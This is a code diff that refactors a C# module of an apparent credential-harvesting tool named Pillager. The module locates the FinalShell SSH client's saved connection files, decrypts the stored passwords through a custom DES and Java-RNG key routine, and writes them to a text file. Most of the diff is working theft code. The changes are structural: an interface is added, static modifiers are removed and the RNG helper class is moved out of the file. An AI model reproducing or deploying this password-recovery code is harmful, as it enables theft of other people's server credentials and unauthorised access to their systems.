@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Pillager.Helper;
+using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
@@ -6,11 +7,9 @@ using System.Text.RegularExpressions;
 
 namespace Pillager.Tools
 {
-    internal class FinalShell
+    internal class FinalShell : ICommand
     {
-        public static string ToolName = "FinalShell";
-
-        public static string GetInfo()
+        public string GetInfo()
         {
             StringBuilder sb = new StringBuilder();
             string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\conn";
@@ -55,7 +54,7 @@ namespace Pillager.Tools
             return sb.ToString();
         }
 
-        public static byte[] desDecode(byte[] data, byte[] head)
+        public byte[] desDecode(byte[] data, byte[] head)
         {
             byte[] TripleDesIV = { 0, 0, 0, 0, 0, 0, 0, 0 };
             byte[] key = new byte[8];
@@ -72,7 +71,7 @@ namespace Pillager.Tools
             return ms.ToArray();
         }
 
-        public static string decodePass(string data)
+        public string decodePass(string data)
         {
             if (data == null)
             {
@@ -90,7 +89,7 @@ namespace Pillager.Tools
 
             return rs;
         }
-        static byte[] ranDomKey(byte[] head)
+        byte[] ranDomKey(byte[] head)
         {
             long ks = 3680984568597093857L / new JavaRng(head[5]).nextInt(127);
             JavaRng random = new JavaRng(ks);
@@ -141,7 +140,7 @@ namespace Pillager.Tools
             }
         }
 
-        public static byte[] md5(byte[] data)
+        public byte[] md5(byte[] data)
         {
             try
             {
@@ -153,60 +152,18 @@ namespace Pillager.Tools
             { return null; }
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\conn";
                 if (!Directory.Exists(connPath)) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "FinalShell");
                 Directory.CreateDirectory(savepath);
                 string output = GetInfo();
-                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
+                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "FinalShell.txt"), output, Encoding.UTF8);
             }
             catch { }
         }
-    }
-    public sealed class JavaRng
-    {
-        public JavaRng(long seed)
-        {
-            _seed = (seed ^ LARGE_PRIME) & ((1L << 48) - 1);
-        }
-
-        public long nextLong()
-        {
-            return ((long)next(32) << 32) + next(32);
-        }
-
-        public int nextInt(int bound)
-        {
-            if (bound <= 0)
-                throw new ArgumentOutOfRangeException(nameof(bound), bound, "bound must be positive");
-
-            int r = next(31);
-            int m = bound - 1;
-            if ((bound & m) == 0)  // i.e., bound is a power of 2
-                r = (int)((bound * (long)r) >> 31);
-            else
-            {
-                for (int u = r;
-                     u - (r = u % bound) + m < 0;
-                     u = next(31))
-                    ;
-            }
-            return r;
-        }
-
-        private int next(int bits)
-        {
-            _seed = (_seed * LARGE_PRIME + SMALL_PRIME) & ((1L << 48) - 1);
-            return (int)((_seed) >> (48 - bits));
-        }
-
-        private long _seed;
-
-        private const long LARGE_PRIME = 0x5DEECE66DL;
-        private const long SMALL_PRIME = 0xBL;
     }
 }
